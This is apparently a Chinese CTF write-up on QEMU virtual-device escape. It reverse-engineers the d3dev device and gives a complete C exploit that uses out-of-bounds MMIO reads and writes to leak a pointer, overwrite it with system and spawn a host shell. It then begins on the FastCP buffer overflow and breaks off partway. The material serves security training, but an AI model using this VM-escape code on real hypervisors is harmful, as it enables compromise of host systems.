<a class="sourceLine" id="cb1-2" title="2"><span class="ex">./qemu-system-x86_64</span> \</a>
<a class="sourceLine" id="cb1-3" title="3">-L pc-bios/ \</a>
<a class="sourceLine" id="cb1-4" title="4">-m 128M \</a>
<a class="sourceLine" id="cb1-5" title="5">-kernel vmlinuz \</a>
<a class="sourceLine" id="cb1-6" title="6">-initrd rootfs.img \</a>
<a class="sourceLine" id="cb1-7" title="7">-smp 1 \</a>
<a class="sourceLine" id="cb1-8" title="8">-append <span class="st">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet&quot;</span> \</a>
<a class="sourceLine" id="cb1-9" title="9">-device d3dev \</a>
<a class="sourceLine" id="cb1-10" title="10">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</a>
<a class="sourceLine" id="cb1-11" title="11">-nographic \</a>
<a class="sourceLine" id="cb1-12" title="12">-monitor /dev/null</a></code></pre></div>
<p>启动脚本中出现<code>-device d3dev</code></p>
<p>使用IDA pro反汇编qemu，查找d3dev</p>
<p>在<code>d3dev_class_init()</code>函数中找到注册了PCI设备d3dev</p>
<p>其中</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb2-1" title="1">  LODWORD(v2[<span class="dv">2</span>].object_cast_cache[<span class="dv">0</span>]) = <span class="bn">0x11E82333</span>;</a>
<a class="sourceLine" id="cb2-2" title="2">  BYTE4(v2[<span class="dv">2</span>].object_cast_cache[<span class="dv">0</span>]) = <span class="bn">0x10</span>;</a>
<a class="sourceLine" id="cb2-3" title="3">  HIWORD(v2[<span class="dv">2</span>].object_cast_cache[<span class="dv">0</span>]) = <span class="bn">0xFF</span>;</a></code></pre></div>
<p>可以知道d3dev设备的Device id（0x11E8）和Vendor id（0x2333）</p>
<p>之后在<code>pci_d3dev_realize()</code>函数中可以找到该设备MMIO和PMIO的读写操作函数，且MMIO的内存大小为0x800，PMIO的内存大小为0x20，在读写的时候如果访问的地址在其范围内则会调用相关的读写函数</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb3-1" title="1"><span class="dt">void</span> __fastcall pci_d3dev_realize(PCIDevice_0 *pdev, Error_0 **errp)</a>
<a class="sourceLine" id="cb3-2" title="2">{</a>
<a class="sourceLine" id="cb3-3" title="3">  memory_region_init_io(</a>
<a class="sourceLine" id="cb3-4" title="4">    (MemoryRegion_0 *)&amp;pdev[<span class="dv">1</span>],</a>
<a class="sourceLine" id="cb3-5" title="5">    &amp;pdev-&gt;qdev.parent_obj,</a>
<a class="sourceLine" id="cb3-6" title="6">    &amp;d3dev_mmio_ops,</a>
<a class="sourceLine" id="cb3-7" title="7">    pdev,</a>
<a class="sourceLine" id="cb3-8" title="8">    <span class="st">&quot;d3dev-mmio&quot;</span>,</a>
<a class="sourceLine" id="cb3-9" title="9">    <span class="bn">0x800</span><span class="bu">uLL</span>);</a>
<a class="sourceLine" id="cb3-10" title="10">  pci_register_bar(pdev, <span class="dv">0</span>, <span class="dv">0</span>, (MemoryRegion_0 *)&amp;pdev[<span class="dv">1</span>]);</a>
<a class="sourceLine" id="cb3-11" title="11">  memory_region_init_io(</a>
<a class="sourceLine" id="cb3-12" title="12">    (MemoryRegion_0 *)&amp;pdev[<span class="dv">1</span>].name[<span class="dv">56</span>],</a>
<a class="sourceLine" id="cb3-13" title="13">    &amp;pdev-&gt;qdev.parent_obj,</a>
<a class="sourceLine" id="cb3-14" title="14">    &amp;d3dev_pmio_ops,</a>
<a class="sourceLine" id="cb3-15" title="15">    pdev,</a>
<a class="sourceLine" id="cb3-16" title="16">    <span class="st">&quot;d3dev-pmio&quot;</span>,</a>
<a class="sourceLine" id="cb3-17" title="17">    <span class="bn">0x20</span><span class="bu">uLL</span>);</a>
<a class="sourceLine" id="cb3-18" title="18">  pci_register_bar(pdev, <span class="dv">1</span>, <span class="dv">1</span><span class="bu">u</span>, (MemoryRegion_0 *)&amp;pdev[<span class="dv">1</span>].name[<span class="dv">56</span>]);</a>
<a class="sourceLine" id="cb3-19" title="19">}</a></code></pre></div>
<p>之后查看mmio和pmio的读写函数，但是在详细分析之前修改这些函数的第一个参数</p>
<p>第一个参数默认为<code>void *opaque</code></p>
<p>但是明显可以看到他是一个指向自定义结构体的指针，我们可以：</p>
<blockquote>
<p>选中opaque -&gt; 右键Convert to struct* -&gt; d3devState</p>
</blockquote>
<p>具体的结构体名词可以在<code>pci_d3dev_realize()</code>函数中查看汇编查看</p>
<p><img src="https://pic1.imgdb.cn/item/6357cdda16f2c2beb1c3ed00.png" /></p>
<p>可以在IDA中详细查看这个结构体的定义</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb4-1" title="1"><span class="bn">00000000</span> d3devState struc ; (<span class="kw">sizeof</span>=<span class="bn">0x1300</span>, align=<span class="bn">0x10</span>, copyof_4545)</a>
<a class="sourceLine" id="cb4-2" title="2"><span class="bn">00000000</span> pdev PCIDevice_0 ?</a>
<a class="sourceLine" id="cb4-3" title="3"><span class="fl">000008E0</span> mmio MemoryRegion_0 ?</a>
<a class="sourceLine" id="cb4-4" title="4"><span class="bn">00000</span><span class="er">9D0</span> pmio MemoryRegion_0 ?</a>
<a class="sourceLine" id="cb4-5" title="5"><span class="bn">00000</span><span class="er">AC0</span> memory_mode dd ?</a>
<a class="sourceLine" id="cb4-6" title="6"><span class="bn">00000</span><span class="er">AC4</span> seek dd ?</a>
<a class="sourceLine" id="cb4-7" title="7"><span class="bn">00000</span><span class="er">AC8</span> init_flag dd ?</a>
<a class="sourceLine" id="cb4-8" title="8"><span class="bn">00000</span><span class="er">ACC</span> mmio_read_part dd ?</a>
<a class="sourceLine" id="cb4-9" title="9"><span class="bn">00000</span><span class="er">AD0</span> mmio_write_part dd ?</a>
<a class="sourceLine" id="cb4-10" title="10"><span class="bn">00000</span><span class="er">AD4</span> r_seed dd ?</a>
<a class="sourceLine" id="cb4-11" title="11"><span class="bn">00000</span><span class="er">AD8</span> blocks dq <span class="dv">257</span> dup(?)</a>
<a class="sourceLine" id="cb4-12" title="12"><span class="fl">000012E0</span> key dd <span class="dv">4</span> dup(?)</a>
<a class="sourceLine" id="cb4-13" title="13"><span class="bn">000012</span><span class="er">F0</span> rand_r dq ?                             ; offset</a>
<a class="sourceLine" id="cb4-14" title="14"><span class="bn">000012</span><span class="er">F8</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-15" title="15"><span class="bn">000012</span><span class="er">F9</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-16" title="16"><span class="bn">000012</span><span class="er">FA</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-17" title="17"><span class="bn">000012</span><span class="er">FB</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-18" title="18"><span class="bn">000012</span><span class="er">FC</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-19" title="19"><span class="bn">000012</span><span class="er">FD</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-20" title="20"><span class="bn">000012</span><span class="er">FE</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-21" title="21"><span class="bn">000012</span><span class="er">FF</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-22" title="22"><span class="bn">00001300</span> d3devState ends</a>
<a class="sourceLine" id="cb4-23" title="23"><span class="bn">00001300</span></a></code></pre></div>
<p>之后分析mmio_read和mmio_write的操作</p>
<p>根据IDA可以看出，<code>d3dev_mmio_read()</code>该函数首先通过<code>seek</code>和<code>addr</code>来从<code>opaque-&gt;blocks</code>中取出<code>block</code>，然后经过<code>tea</code>编码后，返回给用户。</p>
<p>从上面数据结构中，可知<code>block</code>的长度为<code>0x100</code>，而我们这里传入的<code>addr</code>并没有检查范围，所以可以超过<code>0x100</code>，从而发生越界读取。而这里越界之后，可以读取<code>key</code>和<code>rand_r</code>的值。</p>
<p>接着看<code>d3dev_write</code>:该函数主要是将传入的<code>val</code>赋值给<code>opaque-&gt;blocks[offset]</code>。如果是奇数次，则直接赋值。如果是偶数次则先加密再赋值。这里也没有对<code>addr</code>进行范围检查，可以越界写。</p>
<p>之后<code>d3dev_pmio_read()</code></p>
<p><img src="https://pic1.imgdb.cn/item/6357d1ad16f2c2beb1c9063b.png" /></p>
<p><code>d3dev_pmio_read</code>基本功能就是，通过输入不同的<code>addr</code>，会进入不同<code>switch-case</code>。这里就会将<code>opaque-&gt;key</code>的四个值进行返回。</p>
<p><code>d3dev_pmio_write</code>会去调用<code>rand_r</code>函数指针，这个指针存储的是<code>rand</code>函数地址。</p>
<p><img src="https://pic1.imgdb.cn/item/6357d23b16f2c2beb1c9c6f4.png" /></p>
<h3 id="漏洞利用">2. 漏洞利用</h3>
<p>利用mmio_read的越界读获得key值和rand_r的值，其中rand_r保存的rand函数的地址，实现泄露地址，我们通过越界读泄漏该地址，那么就可以得到<code>qemu</code>的基址。</p>
<p>得到了<code>qemu</code>基址后，我们就可以计算得到<code>system</code>函数的地址。</p>
<p>然后通过越界写，修改<code>rand_r</code>存储的函数指针为<code>system</code>。然后去触发<code>system</code>函数。</p>
<p>在<code>d3dev_mmio_write</code>函数中的越界写可以直接修改结构体中的数据，两个分支一个可以直接覆写4字节，另一个经过加密后可以覆写8字节；<code>d3dev_mmio_read</code>读取的数据要经过随机数key和key1进行加密，可以通过越界写将两处key内存覆盖为0或在<code>d3dev_pmio_write</code>函数中将两处key都设置为0</p>
<p>这里想实现<code>getshell</code>，可以去执行<code>rand_r</code>函数，并设置参数为<code>sh</code>。</p>
<p>查看mmio和pmio基地址的方法：</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode sh"><code class="sourceCode bash"><a class="sourceLine" id="cb5-1" title="1"><span class="ex">/sys/devices</span>/pci0000:<span class="ex">00</span>/0000:<span class="ex">00</span>:03.0 <span class="co"># cat resource</span></a>
<a class="sourceLine" id="cb5-2" title="2"><span class="ex">0x00000000febf1000</span> 0x00000000febf17ff 0x0000000000040200</a>
<a class="sourceLine" id="cb5-3" title="3"><span class="ex">0x000000000000c040</span> 0x000000000000c05f 0x0000000000040101</a></code></pre></div>
<p>其中0x00000000febf1000就是mmio地址；0x000000000000c040就是pmio地址</p>
<h3 id="exploit">3. Exploit</h3>
<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb6-1" title="1"><span class="pp">#include</span><span class="im">&lt;stdint.h&gt;</span></a>
<a class="sourceLine" id="cb6-2" title="2"><span class="pp">#include</span><span class="im">&lt;fcntl.h&gt;</span></a>
<a class="sourceLine" id="cb6-3" title="3"><span class="pp">#include</span><span class="im">&lt;sys/mman.h&gt;</span></a>
<a class="sourceLine" id="cb6-4" title="4"><span class="pp">#include</span><span class="im">&lt;sys/io.h&gt;</span></a>
<a class="sourceLine" id="cb6-5" title="5"><span class="pp">#include</span><span class="im">&lt;stdio.h&gt;</span></a>
<a class="sourceLine" id="cb6-6" title="6"><span class="pp">#include</span><span class="im">&lt;unistd.h&gt;</span></a>
<a class="sourceLine" id="cb6-7" title="7"></a>
<a class="sourceLine" id="cb6-8" title="8"><span class="dt">unsigned</span> <span class="dt">char</span>* mmio_mem;</a>
<a class="sourceLine" id="cb6-9" title="9"></a>
<a class="sourceLine" id="cb6-10" title="10"><span class="dt">void</span> Err(<span class="dt">char</span> * err){</a>
<a class="sourceLine" id="cb6-11" title="11">    printf(<span class="st">&quot;Error: %s</span><span class="sc">\n</span><span class="st">&quot;</span>,err);</a>
<a class="sourceLine" id="cb6-12" title="12">    exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb6-13" title="13">}</a>
<a class="sourceLine" id="cb6-14" title="14"></a>
<a class="sourceLine" id="cb6-15" title="15"><span class="dt">void</span> init_pmio(){</a>
<a class="sourceLine" id="cb6-16" title="16">    iopl(<span class="dv">3</span>); <span class="co">// 0x3ff 以上端口全部开启访问</span></a>
<a class="sourceLine" id="cb6-17" title="17">}</a>
<a class="sourceLine" id="cb6-18" title="18"></a>
<a class="sourceLine" id="cb6-19" title="19"><span class="dt">void</span> init_mmio(){</a>
<a class="sourceLine" id="cb6-20" title="20">    <span class="dt">int</span> mmio_fd = open(<span class="st">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>,O_RDWR|O_SYNC);</a>
<a class="sourceLine" id="cb6-21" title="21">    mmio_mem = mmap(<span class="dv">0</span>,<span class="bn">0x1000</span>,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,<span class="dv">0</span>);</a>
<a class="sourceLine" id="cb6-22" title="22">}</a>
<a class="sourceLine" id="cb6-23" title="23"></a>
<a class="sourceLine" id="cb6-24" title="24"><span class="dt">void</span> mmio_write(<span class="dt">uint32_t</span> addr,<span class="dt">uint32_t</span> value){</a>
<a class="sourceLine" id="cb6-25" title="25">    *(<span class="dt">uint32_t</span>*)(mmio_mem+addr) = value;</a>
<a class="sourceLine" id="cb6-26" title="26">}</a>
<a class="sourceLine" id="cb6-27" title="27"></a>
<a class="sourceLine" id="cb6-28" title="28"><span class="dt">uint64_t</span> mmio_read(<span class="dt">uint64_t</span> addr){</a>
<a class="sourceLine" id="cb6-29" title="29">    <span class="cf">return</span> *(<span class="dt">uint64_t</span>*)(mmio_mem+addr); </a>
<a class="sourceLine" id="cb6-30" title="30">}</a>
<a class="sourceLine" id="cb6-31" title="31"></a>
<a class="sourceLine" id="cb6-32" title="32"><span class="dt">uint32_t</span> pmio_base = <span class="bn">0xc040</span>;</a>
<a class="sourceLine" id="cb6-33" title="33"></a>
<a class="sourceLine" id="cb6-34" title="34"><span class="dt">void</span> pmio_write(<span class="dt">uint32_t</span> addr,<span class="dt">uint32_t</span> value){</a>
<a class="sourceLine" id="cb6-35" title="35">    outl(value,pmio_base+addr);</a>
<a class="sourceLine" id="cb6-36" title="36">}</a>
<a class="sourceLine" id="cb6-37" title="37"></a>
<a class="sourceLine" id="cb6-38" title="38"><span class="dt">uint64_t</span> pmio_read(<span class="dt">uint32_t</span> addr){</a>
<a class="sourceLine" id="cb6-39" title="39">    <span class="cf">return</span> (<span class="dt">uint64_t</span>)inl(pmio_base+addr);</a>
<a class="sourceLine" id="cb6-40" title="40">}</a>
<a class="sourceLine" id="cb6-41" title="41"></a>
<a class="sourceLine" id="cb6-42" title="42"><span class="dt">uint64_t</span> encode(<span class="dt">uint32_t</span> high, <span class="dt">uint32_t</span> low) {</a>
<a class="sourceLine" id="cb6-43" title="43"></a>
<a class="sourceLine" id="cb6-44" title="44">    <span class="dt">uint32_t</span> addr = <span class="bn">0xC6EF3720</span>;</a>
<a class="sourceLine" id="cb6-45" title="45"></a>
<a class="sourceLine" id="cb6-46" title="46">    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; <span class="dv">32</span>; ++i) {</a>
<a class="sourceLine" id="cb6-47" title="47">        high = high - ((low + addr) ^ (low &gt;&gt; <span class="dv">5</span>) ^ (<span class="dv">16</span> * low));</a>
<a class="sourceLine" id="cb6-48" title="48">        low = low - (((high + addr) ^ (high &gt;&gt; <span class="dv">5</span>) ^ (<span class="dv">16</span> * high)));</a>
<a class="sourceLine" id="cb6-49" title="49">        addr += <span class="bn">0x61C88647</span>;</a>
<a class="sourceLine" id="cb6-50" title="50">    }</a>
<a class="sourceLine" id="cb6-51" title="51"></a>
<a class="sourceLine" id="cb6-52" title="52">    <span class="cf">return</span> (<span class="dt">uint64_t</span>)high * <span class="bn">0x100000000</span> + low;</a>
<a class="sourceLine" id="cb6-53" title="53">}</a>
<a class="sourceLine" id="cb6-54" title="54"></a>
<a class="sourceLine" id="cb6-55" title="55"><span class="dt">uint64_t</span> decode(<span class="dt">uint32_t</span> high, <span class="dt">uint32_t</span> low) {</a>
<a class="sourceLine" id="cb6-56" title="56"></a>
<a class="sourceLine" id="cb6-57" title="57">    <span class="dt">uint32_t</span> addr = <span class="bn">0x0</span>;</a>
<a class="sourceLine" id="cb6-58" title="58"></a>
<a class="sourceLine" id="cb6-59" title="59">    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; <span class="dv">32</span>; ++i) {</a>
<a class="sourceLine" id="cb6-60" title="60">        addr -= <span class="bn">0x61C88647</span>;</a>
<a class="sourceLine" id="cb6-61" title="61">        low += (((high + addr) ^ (high &gt;&gt; <span class="dv">5</span>) ^ (<span class="dv">16</span> * high)));</a>
<a class="sourceLine" id="cb6-62" title="62">        high += ((low + addr) ^ (low &gt;&gt; <span class="dv">5</span>) ^ (<span class="dv">16</span> * low));</a>
<a class="sourceLine" id="cb6-63" title="63">    }</a>
<a class="sourceLine" id="cb6-64" title="64"></a>
<a class="sourceLine" id="cb6-65" title="65">    <span class="cf">return</span> (<span class="dt">uint64_t</span>)high * <span class="bn">0x100000000</span> + low;</a>
<a class="sourceLine" id="cb6-66" title="66">}</a>
<a class="sourceLine" id="cb6-67" title="67"></a>
<a class="sourceLine" id="cb6-68" title="68"><span class="dt">int</span> main(){</a>
<a class="sourceLine" id="cb6-69" title="69">    printf(<span class="st">&quot;init pci and mmio:</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-70" title="70">    init_pmio();</a>
<a class="sourceLine" id="cb6-71" title="71">    init_mmio();</a>
<a class="sourceLine" id="cb6-72" title="72"></a>
<a class="sourceLine" id="cb6-73" title="73">    printf(<span class="st">&quot;set seek = 0x100</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-74" title="74">    pmio_write(<span class="bn">0x8</span>,<span class="bn">0x100</span>);</a>
<a class="sourceLine" id="cb6-75" title="75">    printf(<span class="st">&quot;set key = 0x0</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-76" title="76">    pmio_write(<span class="bn">0x4</span>,<span class="dv">0</span>);</a>
<a class="sourceLine" id="cb6-77" title="77"></a>
<a class="sourceLine" id="cb6-78" title="78"></a>
<a class="sourceLine" id="cb6-79" title="79">    printf(<span class="st">&quot;oob read rand_r</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-80" title="80">    <span class="dt">uint64_t</span> value = mmio_read(<span class="dv">3</span>*<span class="dv">8</span>);</a>
<a class="sourceLine" id="cb6-81" title="81">    printf(<span class="st">&quot;%lx</span><span class="sc">\n</span><span class="st">&quot;</span>,value);</a>
<a class="sourceLine" id="cb6-82" title="82"></a>
<a class="sourceLine" id="cb6-83" title="83">    <span class="dt">uint64_t</span> rand_r = decode(value&gt;&gt;<span class="dv">32</span>, value&amp;<span class="bn">0xffffffff</span>);</a>
<a class="sourceLine" id="cb6-84" title="84">    printf(<span class="st">&quot;%lx</span><span class="sc">\n</span><span class="st">&quot;</span>, rand_r);</a>
<a class="sourceLine" id="cb6-85" title="85"></a>
<a class="sourceLine" id="cb6-86" title="86">    <span class="dt">uint64_t</span> system_addr = rand_r+<span class="bn">0xa560</span>;</a>
<a class="sourceLine" id="cb6-87" title="87">    printf(<span class="st">&quot;system_addr ==&gt; %lx</span><span class="sc">\n</span><span class="st">&quot;</span>, system_addr);</a>
<a class="sourceLine" id="cb6-88" title="88"></a>
<a class="sourceLine" id="cb6-89" title="89">    <span class="dt">uint64_t</span> encode_system = encode(system_addr&gt;&gt;<span class="dv">32</span>, system_addr&amp;<span class="bn">0xffffffff</span>);</a>
<a class="sourceLine" id="cb6-90" title="90">    printf(<span class="st">&quot;encode_system ==&gt; %lx</span><span class="sc">\n</span><span class="st">&quot;</span>, encode_system);</a>
<a class="sourceLine" id="cb6-91" title="91"></a>
<a class="sourceLine" id="cb6-92" title="92">    <span class="dt">uint32_t</span> es_low  = encode_system % <span class="bn">0x100000000</span>;</a>
<a class="sourceLine" id="cb6-93" title="93">    <span class="dt">uint32_t</span> es_high = encode_system / <span class="bn">0x100000000</span>;</a>
<a class="sourceLine" id="cb6-94" title="94"></a>
<a class="sourceLine" id="cb6-95" title="95">    printf(<span class="st">&quot;oob write</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-96" title="96">    mmio_write(<span class="dv">3</span>*<span class="dv">8</span>, es_low);</a>
<a class="sourceLine" id="cb6-97" title="97">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb6-98" title="98">    mmio_write(<span class="dv">3</span>*<span class="dv">8</span>, es_high);</a>
<a class="sourceLine" id="cb6-99" title="99"></a>
<a class="sourceLine" id="cb6-100" title="100">    printf(<span class="st">&quot;set seek=0x0</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-101" title="101">    pmio_write(<span class="bn">0x8</span>, <span class="bn">0x0</span>);</a>
<a class="sourceLine" id="cb6-102" title="102"></a>
<a class="sourceLine" id="cb6-103" title="103"></a>
<a class="sourceLine" id="cb6-104" title="104">    pmio_write(<span class="bn">0x1c</span>,<span class="bn">0x6873</span>); <span class="co">// 0x6873 == &quot;sh&quot;</span></a>
<a class="sourceLine" id="cb6-105" title="105"></a>
<a class="sourceLine" id="cb6-106" title="106">}</a></code></pre></div>
<div class="sourceCode" id="cb7"><pre class="sourceCode sh"><code class="sourceCode bash"><a class="sourceLine" id="cb7-1" title="1"><span class="co">#!bash</span></a>
<a class="sourceLine" id="cb7-2" title="2"><span class="fu">gcc</span> expliot.c -o expliot --static <span class="kw">&amp;&amp;\</span></a>
<a class="sourceLine" id="cb7-3" title="3"><span class="fu">chmod</span> +x expliot <span class="kw">&amp;&amp;\</span></a>
<a class="sourceLine" id="cb7-4" title="4"><span class="fu">cp</span> ./expliot ./cpio-root/expliot <span class="kw">&amp;&amp;\</span></a>
<a class="sourceLine" id="cb7-5" title="5"><span class="bu">cd</span> ./cpio-root <span class="kw">&amp;&amp;\</span></a>
<a class="sourceLine" id="cb7-6" title="6"><span class="fu">find</span> . <span class="kw">|</span> <span class="fu">cpio</span> -o --format=newc <span class="op">&gt;</span> ../rootfs.img</a></code></pre></div>
<h2 id="x02-hws2021-fastcp">0x02 HWS2021 FastCP</h2>
<h3 id="分析-1">1. 分析</h3>
<pre class="bas"><code>#!/bin/sh

./qemu-system-x86_64 -initrd ./rootfs.img -nographic -kernel ./vmlinuz-5.0.5-generic -append &quot;priority=low console=ttyS0&quot; -monitor /dev/null --device FastCP
</code></pre>
<p>可以看到有设备FastCP</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb9-1" title="1"><span class="dt">void</span> __fastcall pci_FastCP_realize(PCIDevice_0 *pdev, Error_0 **errp)</a>
<a class="sourceLine" id="cb9-2" title="2">{</a>
<a class="sourceLine" id="cb9-3" title="3">  Object_0 *v2; <span class="co">// rbp</span></a>
<a class="sourceLine" id="cb9-4" title="4"></a>
<a class="sourceLine" id="cb9-5" title="5">  v2 = object_dynamic_cast_assert(</a>
<a class="sourceLine" id="cb9-6" title="6">         &amp;pdev-&gt;qdev.parent_obj,</a>
<a class="sourceLine" id="cb9-7" title="7">         <span class="st">&quot;FastCP&quot;</span>,</a>
<a class="sourceLine" id="cb9-8" title="8">         <span class="st">&quot;/root/source/qemu/hw/misc/fastcp.c&quot;</span>,</a>
<a class="sourceLine" id="cb9-9" title="9">         <span class="dv">258</span>,</a>
<a class="sourceLine" id="cb9-10" title="10">         <span class="st">&quot;pci_FastCP_realize&quot;</span>);</a>
<a class="sourceLine" id="cb9-11" title="11">  pdev-&gt;config[<span class="dv">61</span>] = <span class="dv">1</span>;</a>
<a class="sourceLine" id="cb9-12" title="12">  <span class="cf">if</span> ( !msi_init(pdev, <span class="dv">0</span>, <span class="dv">1</span><span class="bu">u</span>, <span class="dv">1</span>, <span class="dv">0</span>, errp) )</a>
<a class="sourceLine" id="cb9-13" title="13">  {</a>
<a class="sourceLine" id="cb9-14" title="14">    timer_init_full(</a>
<a class="sourceLine" id="cb9-15" title="15">      (QEMUTimer_0 *)&amp;v2[<span class="dv">166</span>].properties,</a>
<a class="sourceLine" id="cb9-16" title="16">      <span class="dv">0</span><span class="bu">LL</span>,</a>
<a class="sourceLine" id="cb9-17" title="17">      QEMU_CLOCK_VIRTUAL,</a>
<a class="sourceLine" id="cb9-18" title="18">      (<span class="dt">int</span>)&amp;stru_F4240,</a>
<a class="sourceLine" id="cb9-19" title="19">      <span class="dv">0</span>,</a>
<a class="sourceLine" id="cb9-20" title="20">      fastcp_cp_timer,</a>
<a class="sourceLine" id="cb9-21" title="21">      v2);</a>
<a class="sourceLine" id="cb9-22" title="22">    memory_region_init_io(</a>
<a class="sourceLine" id="cb9-23" title="23">      (MemoryRegion_0 *)&amp;v2[<span class="dv">57</span>].free,</a>
<a class="sourceLine" id="cb9-24" title="24">      v2,</a>
<a class="sourceLine" id="cb9-25" title="25">      &amp;fastcp_mmio_ops,</a>
<a class="sourceLine" id="cb9-26" title="26">      v2,</a>
<a class="sourceLine" id="cb9-27" title="27">      <span class="st">&quot;fastcp-mmio&quot;</span>,</a>
<a class="sourceLine" id="cb9-28" title="28">      (<span class="dt">uint64_t</span>)&amp;stru_100000);</a>
<a class="sourceLine" id="cb9-29" title="29">    pci_register_bar(pdev, <span class="dv">0</span>, <span class="dv">0</span>, (MemoryRegion_0 *)&amp;v2[<span class="dv">57</span>].free);</a>
<a class="sourceLine" id="cb9-30" title="30">    HIDWORD(v2[<span class="dv">63</span>].parent) = <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb9-31" title="31">  }</a>
<a class="sourceLine" id="cb9-32" title="32">}</a></code></pre></div>
<p>主要有mmio操作和cp_timer操作</p>
<p>接下来分析mmio_read操作</p>
<p><img src="https://pic1.imgdb.cn/item/6358f67116f2c2beb1334b2c.png" /></p>
<p>可以看到如果size==8 ，根据addr的不同返回不同的数据，</p>
<ul>
<li>功能0x08 返回opaque-&gt;cp_state.CP_list_src</li>
<li>功能0x10 返回opaque-&gt;cp_state.CP_list_cnt</li>
<li>功能0x18 返回opaque-&gt;cp_state.cmd3</li>
</ul>
<p>其中为了控制size==0需要设置addr为<code>uint64_t</code>类型</p>
<p>接下来分析mmio_write</p>
<p><img src="https://pic1.imgdb.cn/item/6358f82716f2c2beb136cffd.png" /></p>
<p>当addr==24的时候不仅设置cmd，还触发时钟函数<code>timer_mod</code></p>
<p>之后分析<code>fastcp_cp_timer</code>函数</p>
<p><img src="https://pic1.imgdb.cn/item/6358fa8116f2c2beb13b7715.png" /></p>
<p>timer函数根据传入的参数cmd来选择执行的分支</p>
<p><img src="https://pic1.imgdb.cn/item/6358fbce16f2c2beb13db48c.png" /></p>
<p>其中<code>void cpu_physical_memory_rw(hwaddr addr, uint8_t *buf, int len, int is_write)</code></p>
<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb10-1" title="1"><span class="dt">void</span> cpu_physical_memory_rw(hwaddr addr, <span class="dt">void</span> *buf,</a>
<a class="sourceLine" id="cb10-2" title="2">                            hwaddr len, <span class="dt">bool</span> is_write);</a>
<a class="sourceLine" id="cb10-3" title="3"><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> cpu_physical_memory_read(hwaddr addr,</a>
<a class="sourceLine" id="cb10-4" title="4">                                            <span class="dt">void</span> *buf, hwaddr len)</a>
<a class="sourceLine" id="cb10-5" title="5">{</a>
<a class="sourceLine" id="cb10-6" title="6">    cpu_physical_memory_rw(addr, buf, len, false);</a>
<a class="sourceLine" id="cb10-7" title="7">}</a>
<a class="sourceLine" id="cb10-8" title="8"><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> cpu_physical_memory_write(hwaddr addr,</a>
<a class="sourceLine" id="cb10-9" title="9">                                             <span class="dt">const</span> <span class="dt">void</span> *buf, hwaddr len)</a>
<a class="sourceLine" id="cb10-10" title="10">{</a>
<a class="sourceLine" id="cb10-11" title="11">    cpu_physical_memory_rw(addr, (<span class="dt">void</span> *)buf, len, true);</a>
<a class="sourceLine" id="cb10-12" title="12">}</a></code></pre></div>
<p>如果<code>opaque-&gt;cp_state.CP_list_cnt</code>大小大于<code>0x10</code>，则会根据<code>cp_state.CP_list_cnt</code>的大小循环从<code>opaque-&gt;cp_state.CP_list_src</code>读取结构体到<code>cp_info</code>，然后依次将<code>CP_src</code>中的数据写入到<code>CP_buffer</code>，然后从<code>CP_buffer</code>中读取数据到<code>CP_dst</code>，长度由<code>CP_cnt</code>指定。</p>
<p>漏洞很明显位于在命令为 1 且 CP_list_cnt 大于 0x10 的时候，复制前没有检测 CP_cnt 是否会大于 0x1000 字节，而在 FastCPState 的结构中（结构如下）</p>
<pre><code>00000000 FastCPState struc ; (sizeof=0x1A30, align=0x10, copyof_4530)
00000000 pdev PCIDevice_0 ?
000008F0 mmio MemoryRegion_0 ?
000009E0 cp_state CP_state ?
000009F8 handling db ?
000009F9 db ? ; undefined
000009FA db ? ; undefined
000009FB db ? ; undefined
000009FC irq_status dd ?
00000A00 CP_buffer db 4096 dup(?)
00001A00 cp_timer QEMUTimer_0 ?
00001A30 FastCPState ends</code></pre>
<p>可以看出CP_buffer只有0x1000字节。</p>
<h3 id="物理地址转换">2. 物理地址转换</h3>
<p>通过<code>pagemap</code>将虚拟机中的虚拟地址转换为物理地址。</p>
<p>根据内核文档可知，每个虚拟页在<code>/proc/pid/pagemap</code>中对应一项长度为<code>64 bits</code>的数据，其中<code>Bit 63</code>为<code>page present</code>，表示物理内存页是否已存在；若物理页已存在，则<code>Bits 0-54</code>表示物理页号，此外，需要<code>root</code>权限的进程才能读取<code>/proc/pid/pagemap</code>中的内容。</p>
<pre><code>pagemap is a new (as of 2.6.25) set of interfaces in the kernel that allow
userspace programs to examine the page tables and related information by
